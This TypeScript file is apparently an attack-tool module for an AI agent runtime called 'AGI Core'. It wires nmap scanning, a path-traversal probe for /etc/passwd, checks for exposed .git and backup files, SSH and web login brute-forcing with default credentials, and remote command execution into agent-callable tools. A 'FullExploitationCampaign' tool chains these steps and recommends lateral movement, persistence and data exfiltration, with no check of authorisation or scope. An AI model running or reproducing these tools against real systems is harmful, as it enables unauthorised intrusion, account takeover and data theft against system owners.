/**
 * Advanced Exploitation Module
 * Real-world exploitation capabilities integrated with AGI Core
 */

import { execSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import type { ToolDefinition } from '../core/toolRuntime.js';

export interface ExploitationResult {
  success: boolean;
  target: string;
  attackType: string;
  details: Record<string, any>;
  evidencePath?: string;
  timestamp: string;
}

export interface Vulnerability {
  type: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  exploitation: string[];
  remediation: string;
}

// Core exploitation utilities
export function makeEvidenceFile(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), `${prefix}-`));
  const path = join(dir, 'evidence.txt');
  writeFileSync(path, `Advanced exploitation evidence - ${new Date().toISOString()}`);
  return path;
}

export function runNmap(target: string, ports: string = '80,443,22,21,25,53,8080,8443,3306,3389,5432,27017,5985,5986'): string {
  try {
    const result = execSync(`/opt/homebrew/bin/nmap -sT -T4 -p ${ports} ${target}`, {
      encoding: 'utf-8',
      timeout: 60000
    });
    return result;
  } catch (error: any) {
    return `Scan failed: ${error.message}`;
  }
}

export function runAdvancedNmap(target: string, options: string = '-sV -sC -O --script=vuln'): string {
  try {
    const result = execSync(`/opt/homebrew/bin/nmap ${options} ${target}`, {
      encoding: 'utf-8',
      timeout: 120000
    });
    return result;
  } catch (error: any) {
    return `Advanced scan failed: ${error.message}`;
  }
}

// Vulnerability detection
export function detectWebVulnerabilities(target: string, port: number): Vulnerability[] {
  const vulns: Vulnerability[] = [];
  
  // Common web vulnerability checks
  const checks = [
    {
      name: 'directory_traversal',
      test: `timeout 5 curl -s -k "http://${target}:${port}/../../../../etc/passwd" 2>&1 | grep -E 'root:.*:/bin' || true`,
      severity: 'high' as const,
      description: 'Directory traversal vulnerability allows reading arbitrary files',
      exploitation: ['Read system files', 'Extract credentials', 'Access sensitive data'],
      remediation: 'Validate and sanitize file paths, use whitelists'
    },
    {
      name: 'git_exposure',
      test: `timeout 5 curl -s -k -I "http://${target}:${port}/.git/config" 2>&1 | head -1 | grep -E '200|301|302' || true`,
      severity: 'critical' as const,
      description: 'Exposed .git directory reveals source code and credentials',
      exploitation: ['Source code extraction', 'Credential harvesting', 'Internal path discovery'],
      remediation: 'Block access to .git directory, implement proper access controls'
    },
    {
      name: 'phpinfo_exposure',
      test: `timeout 5 curl -s -k "http://${target}:${port}/phpinfo.php" 2>&1 | grep -i 'php version' || true`,
      severity: 'medium' as const,
      description: 'phpinfo.php exposes PHP configuration and system information',
      exploitation: ['Information disclosure', 'Version enumeration', 'Configuration analysis'],
      remediation: 'Remove or restrict access to phpinfo.php'
    },
    {
      name: 'backup_file_exposure',
      test: `for ext in .bak .old .backup .save .orig; do timeout 2 curl -s -k -I "http://${target}:${port}/index\$ext" 2>&1 | head -1 | grep -E '200|301|302' && echo "found" && break; done`,
      severity: 'medium' as const,
      description: 'Exposed backup files may contain sensitive information',
      exploitation: ['Source code analysis', 'Credential extraction', 'Configuration discovery'],
      remediation: 'Remove backup files from web directories'
    }
  ];
  
  for (const check of checks) {
    try {
      const result = execSync(check.test, { encoding: 'utf-8' });
      if (result.trim()) {
        vulns.push({
          type: check.name,
          severity: check.severity,
          description: check.description,
          exploitation: check.exploitation,
          remediation: check.remediation
        });
      }
    } catch {
      // Continue checking other vulnerabilities
    }
  }
  
  return vulns;
}

// Credential attacks
export function sshCredentialAttack(target: string, port: number = 22): ExploitationResult {
  const evidencePath = makeEvidenceFile('ssh-attack');
  const commonCredentials = [
    { username: 'root', password: 'root' },
    { username: 'admin', password: 'admin' },
    { username: 'ubuntu', password: 'ubuntu' },
    { username: 'pi', password: 'raspberry' },
    { username: 'test', password: 'test' },
    { username: 'user', password: 'user' },
    { username: 'administrator', password: 'administrator' },
    { username: 'git', password: 'git' },
    { username: 'nginx', password: 'nginx' },
    { username: 'apache', password: 'apache' }
  ];
  
  let success = false;
  let successfulCredential = null;
  let commandOutput = '';
  
  for (const cred of commonCredentials) {
    try {
      const testCmd = `sshpass -p "${cred.password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes -p ${port} ${cred.username}@${target} "echo 'SSH_SUCCESS'" 2>&1`;
      const result = execSync(testCmd, { encoding: 'utf-8', timeout: 3000 });
      
      if (result.includes('SSH_SUCCESS')) {
        success = true;
        successfulCredential = cred;
        
        // Try to execute commands
        try {
          const cmdResult = execSync(
            `sshpass -p "${cred.password}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p ${port} ${cred.username}@${target} "id; uname -a; whoami; ls -la /tmp" 2>&1`,
            { encoding: 'utf-8', timeout: 5000 }
          );
          commandOutput = cmdResult;
        } catch (cmdError) {
          commandOutput = 'Command execution failed';
        }
        break;
      }
    } catch (error) {
      // Continue to next credential
      continue;
    }
  }
  
  const result: ExploitationResult = {
    success,
    target,
    attackType: 'ssh_credential_attack',
    details: {
      credentialsTested: commonCredentials.length,
      successfulCredential,
      commandOutput: commandOutput.split('\n').slice(0, 20),
      port
    },
    evidencePath,
    timestamp: new Date().toISOString()
  };
  
  // Write evidence
  writeFileSync(evidencePath, JSON.stringify(result, null, 2));
  
  return result;
}

// Web exploitation
export function webCredentialAttack(target: string, port: number = 443): ExploitationResult {
  const evidencePath = makeEvidenceFile('web-attack');
  const commonCredentials = [
    { username: 'admin', password: 'admin' },
    { username: 'admin', password: 'password' },
    { username: 'admin', password: '123456' },
    { username: 'administrator', password: 'administrator' },
    { username: 'root', password: 'root' },
    { username: 'user', password: 'user' },
    { username: 'guest', password: 'guest' },
    { username: 'test', password: 'test' }
  ];
  
  const loginEndpoints = ['/login', '/admin/login', '/wp-login.php', '/administrator/login'];
  let success = false;
  let successfulEndpoint = '';
  let successfulCredential = null;
  
  for (const endpoint of loginEndpoints) {
    for (const cred of commonCredentials) {
      try {
        const protocol = port === 443 ? 'https' : 'http';
        const loginTest = execSync(
          `timeout 5 curl -s -k -X POST --data "username=${cred.username}&password=${cred.password}" "${protocol}://${target}:${port}${endpoint}" 2>&1 | grep -i 'success\\|dashboard\\|welcome\\|logged' || true`,
          { encoding: 'utf-8' }
        );
        
        if (loginTest.trim()) {
          success = true;
          successfulEndpoint = endpoint;
          successfulCredential = cred;
          break;
        }
      } catch {
        continue;
      }
    }
    if (success) break;
  }
  
  const result: ExploitationResult = {
    success,
    target,
    attackType: 'web_credential_attack',
    details: {
      endpointsTested: loginEndpoints,
      credentialsTested: commonCredentials.length,
      successfulEndpoint,
      successfulCredential,
      port
    },
    evidencePath,
    timestamp: new Date().toISOString()
  };
  
  writeFileSync(evidencePath, JSON.stringify(result, null, 2));
  
  return result;
}

// API exploitation
export function apiExploitation(target: string, port: number = 443): ExploitationResult {
  const evidencePath = makeEvidenceFile('api-exploit');
  const apiEndpoints = [
    '/api', '/api/v1', '/rest', '/graphql', '/swagger', '/openapi',
    '/api/docs', '/api/console', '/api/explorer'
  ];
  
  const discoveredEndpoints: Array<{ endpoint: string; status: string; info: string }> = [];
  
  for (const endpoint of apiEndpoints) {
    try {
      const protocol = port === 443 ? 'https' : 'http';
      const check = execSync(
        `timeout 5 curl -s -k -I "${protocol}://${target}:${port}${endpoint}" 2>&1 | head -1`,
        { encoding: 'utf-8' }
      );
      
      const statusMatch = check.match(/(\d{3})/);
      if (statusMatch) {
        const status = statusMatch[1];
        if (status !== '404') {
          // Get more info
          const infoCheck = execSync(
            `timeout 5 curl -s -k "${protocol}://${target}:${port}${endpoint}" 2>&1 | head -100`,
            { encoding: 'utf-8' }
          );
          
          discoveredEndpoints.push({
            endpoint,
            status,
            info: infoCheck.substring(0, 500)
          });
        }
      }
    } catch {
      continue;
    }
  }
  
  const result: ExploitationResult = {
    success: discoveredEndpoints.length > 0,
    target,
    attackType: 'api_discovery',
    details: {
      discoveredEndpoints,
      totalEndpointsTested: apiEndpoints.length,
      port
    },
    evidencePath,
    timestamp: new Date().toISOString()
  };
  
  writeFileSync(evidencePath, JSON.stringify(result, null, 2));
  
  return result;
}

// Comprehensive exploitation handler
export function createAdvancedExploitationTools() {
  const tools: ToolDefinition[] = [];
  
  const addTool = (name: string, description: string, handler: ToolDefinition['handler']) => {
    tools.push({ name, description, handler });
  };
  
  // Network reconnaissance
  addTool('AdvancedRecon', 'Comprehensive network reconnaissance with vulnerability detection', async (args: any) => {
    const target = args.target || 'localhost';
    const ports = args.ports || '80,443,22,21,25,53,8080,8443';
    const depth = args.depth || 'standard';
    
    const evidencePath = makeEvidenceFile('advanced-recon');
    const results: any = { target, timestamp: new Date().toISOString() };
    
    try {
      // Network scan
      const scanResult = depth === 'deep' ? runAdvancedNmap(target) : runNmap(target, ports);
      results.scan = scanResult;
      
      // Parse open ports
      const openPorts = scanResult.match(/(\d+)\/tcp\s+open/g)?.map((m: string) => parseInt(m)) || [];
      results.openPorts = openPorts;
      
      // Vulnerability detection
      const vulnerabilities: Vulnerability[] = [];
      for (const port of openPorts) {
        if (port === 80 || port === 443 || port === 8080 || port === 8443) {
          const webVulns = detectWebVulnerabilities(target, port);
          vulnerabilities.push(...webVulns.map(v => ({ ...v, port })));
        }
      }
      results.vulnerabilities = vulnerabilities;
      
      // Service-specific checks
      const serviceChecks: any = {};
      if (openPorts.includes(22)) {
        serviceChecks.ssh = 'SSH service detected - credential attack possible';
      }
      if (openPorts.includes(21)) {
        serviceChecks.ftp = 'FTP service detected - anonymous login check recommended';
      }
      if (openPorts.includes(3306) || openPorts.includes(5432)) {
        serviceChecks.database = 'Database service detected - default credential check recommended';
      }
      results.serviceChecks = serviceChecks;
      
      results.evidencePath = evidencePath;
      results.recommendations = vulnerabilities.length > 0 
        ? vulnerabilities.map(v => `Exploit ${v.type} (${v.severity}): ${v.exploitation.join(', ')}`)
        : ['Perform deeper enumeration', 'Check for misconfigurations', 'Test default credentials'];
      
    } catch (error: any) {
      results.error = error.message;
    }
    
    // Write evidence
    writeFileSync(evidencePath, JSON.stringify(results, null, 2));
    
    return JSON.stringify(results, null, 2);
  });
  
  // Credential attacks
  addTool('CredentialAttack', 'SSH and web credential brute force attacks', async (args: any) => {
    const target = args.target || 'localhost';
    const attackType = args.attackType || 'ssh';
    const port = args.port || (attackType === 'ssh' ? 22 : 443);
    
    let result: ExploitationResult;
    
    if (attackType === 'ssh') {
      result = sshCredentialAttack(target, port);
    } else if (attackType === 'web') {
      result = webCredentialAttack(target, port);
    } else {
      result = {
        success: false,
        target,
        attackType: 'unknown',
        details: { error: `Unknown attack type: ${attackType}` },
        timestamp: new Date().toISOString()
      };
    }
    
    return JSON.stringify(result, null, 2);
  });
  
  // API exploitation
  addTool('APIExploitation', 'Discover and exploit exposed APIs', async (args: any) => {
    const target = args.target || 'localhost';
    const port = args.port || 443;
    
    const result = apiExploitation(target, port);
    return JSON.stringify(result, null, 2);
  });
  
  // Full exploitation campaign
  addTool('FullExploitationCampaign', 'Complete exploitation campaign against target', async (args: any) => {
    const target = args.target || 'localhost';
    const evidencePath = makeEvidenceFile('full-campaign');
    
    const campaignResults: any = {
      target,
      timestamp: new Date().toISOString(),
      phases: []
    };
    
    try {
      // Phase 1: Reconnaissance
      campaignResults.phases.push({
        phase: 'reconnaissance',
        startTime: new Date().toISOString()
      });
      
      const scanResult = runAdvancedNmap(target);
      const openPorts = scanResult.match(/(\d+)\/tcp\s+open/g)?.map((m: string) => parseInt(m)) || [];
      
      campaignResults.phases[0].results = {
        scanSummary: scanResult.split('\n').slice(0, 50),
        openPorts
      };
      
      // Phase 2: Vulnerability Assessment
      campaignResults.phases.push({
        phase: 'vulnerability_assessment',
        startTime: new Date().toISOString()
      });
      
      const vulnerabilities: any[] = [];
      for (const port of openPorts) {
        if (port === 80 || port === 443 || port === 8080 || port === 8443) {
          const webVulns = detectWebVulnerabilities(target, port);
          webVulns.forEach(v => vulnerabilities.push({ ...v, port }));
        }
      }
      
      campaignResults.phases[1].results = { vulnerabilities };
      
      // Phase 3: Exploitation Attempts
      campaignResults.phases.push({
        phase: 'exploitation',
        startTime: new Date().toISOString()
      });
      
      const exploitationResults: any[] = [];
      
      // SSH attack if port 22 open
      if (openPorts.includes(22)) {
        const sshResult = sshCredentialAttack(target, 22);
        exploitationResults.push({
          service: 'ssh',
          result: sshResult.success ? 'COMPROMISED' : 'failed',
          details: sshResult.details
        });
      }
      
      // Web attack if HTTP/HTTPS ports open
      if (openPorts.includes(80) || openPorts.includes(443) || openPorts.includes(8080) || openPorts.includes(8443)) {
        const webPort = openPorts.includes(443) ? 443 : openPorts.includes(80) ? 80 : openPorts.includes(8443) ? 8443 : 8080;
        const webResult = webCredentialAttack(target, webPort);
        exploitationResults.push({
          service: 'web',
          result: webResult.success ? 'COMPROMISED' : 'failed',
          details: webResult.details
        });
      }
      
      // API discovery
      if (openPorts.includes(80) || openPorts.includes(443)) {
        const apiPort = openPorts.includes(443) ? 443 : 80;
        const apiResult = apiExploitation(target, apiPort);
        exploitationResults.push({
          service: 'api',
          result: apiResult.success ? 'DISCOVERED' : 'none',
          details: apiResult.details
        });
      }
      
      campaignResults.phases[2].results = { exploitationResults };
      
      // Phase 4: Summary and Recommendations
      campaignResults.phases.push({
        phase: 'summary',
        startTime: new Date().toISOString()
      });
      
      const criticalFindings = vulnerabilities.filter(v => v.severity === 'critical' || v.severity === 'high');
      const compromisedServices = exploitationResults.filter(r => r.result === 'COMPROMISED');
      
      campaignResults.phases[3].results = {
        criticalFindings: criticalFindings.length,
        compromisedServices: compromisedServices.length,
        recommendations: [
          ...criticalFindings.map(v => `Exploit ${v.type}: ${v.exploitation.join(', ')}`),
          ...compromisedServices.map(s => `Leverage ${s.service} access for further exploitation`),
          'Perform lateral movement',
          'Establish persistence',
          'Exfiltrate data'
        ]
      };
      
      campaignResults.success = compromisedServices.length > 0 || criticalFindings.length > 0;
      campaignResults.evidencePath = evidencePath;
      
    } catch (error: any) {
      campaignResults.error = error.message;
      campaignResults.success = false;
    }
    
    // Write evidence
    writeFileSync(evidencePath, JSON.stringify(campaignResults, null, 2));
    
    return JSON.stringify(campaignResults, null, 2);
  });
  
  return { id: 'advanced-exploitation', tools };
}